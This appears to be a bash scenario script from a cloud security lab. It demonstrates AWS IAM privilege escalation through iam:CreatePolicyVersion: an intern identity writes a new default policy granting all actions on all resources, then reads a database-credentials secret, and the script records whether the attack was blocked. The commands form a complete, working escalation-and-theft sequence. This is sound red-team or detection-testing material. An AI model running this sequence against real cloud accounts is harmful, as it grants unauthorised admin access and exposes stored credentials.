#!/usr/bin/env bash
# Scenario 1: IAM privilege escalation via iam:CreatePolicyVersion
# ATT&CK: T1580 (discovery), T1098.003 (escalation)
source "$(dirname "$0")/common.sh"

POLICY_ARN="$(tf_out intern_policy_arn)"
use_identity intern

log "Step 1: Who am I?"
attempt sts get-caller-identity || true

log "Step 2: Recon my own permissions"
attempt iam list-attached-user-policies --user-name lab-intern || true
attempt iam list-policy-versions --policy-arn "$POLICY_ARN" || true

log "Step 3: Confirm I can't read secrets yet"
if attempt secretsmanager list-secrets >/dev/null; then
  warn "Intern can already list secrets before escalation. Is IAM enforcement on? Run scripts/preflight.sh"
fi

log "Step 4: Write a new default version of my policy granting *:*"
ADMIN_DOC="$(mktemp)"
trap 'rm -f "$ADMIN_DOC"' EXIT
cat >"$ADMIN_DOC" <<'JSON'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
JSON

if ! attempt iam create-policy-version \
      --policy-arn "$POLICY_ARN" \
      --policy-document "file://$ADMIN_DOC" \
      --set-as-default; then
  finish blocked
fi

sleep 2
log "Step 5: Prove escalation by reading the crown-jewel secret"
if attempt secretsmanager get-secret-value \
      --secret-id "lab/prod/db-credentials" \
      --query SecretString --output text; then
  finish succeeded
fi
finish blocked
